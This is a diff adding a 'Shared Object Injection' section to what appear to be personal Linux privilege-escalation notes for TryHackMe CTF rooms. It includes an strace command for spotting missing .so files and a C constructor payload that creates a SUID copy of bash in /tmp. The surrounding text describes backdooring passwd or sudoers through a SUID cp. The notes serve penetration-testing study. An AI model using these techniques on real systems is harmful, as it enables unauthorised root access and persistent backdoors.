@@ -115,6 +115,28 @@ Sometimes the results will contain something cutsom which you can go on to enume
 One interesting idea with suid came about when exploiting this room: https://tryhackme.com/jr/zsecurityctf1 on Try Hack Me. When you have higher permissions on the cp command, you can create your own version of the passwd file, or sudoers file, and then add yourself a backdoor in (whether a backdor user in the case of the passwd file, adjusting a users group in the passwd file, or giving them sudo permissions to execute a vulnerable binary as root). The same can apply with sudo.
 
 
+### *Shared Object Injection:* ###
+We can use 'strace' to find out what the binary is actually doing, and look for specific things. We are looking for what it is trying to access, but failing to.
+
+```bash
+strace /usr/local/bin/suid-binary 2>&1 | grep "open|access|no such file"
+```
+
+We are looking for read write access to a particular file that is being loaded in (.so files). We can replace the code within the file (or create a file if it cannot be found), with our own malicious code:
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+
+void inject() {
+  system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash"); //creates a suid copy of the bash binary in /tmp/bash
+}
+
+//compile with 'gcc -shared -fPIC -o file.so file.c'
+```
+
+
 ### *Sudo:* ###
 List which files you have sudo permissions for:
 
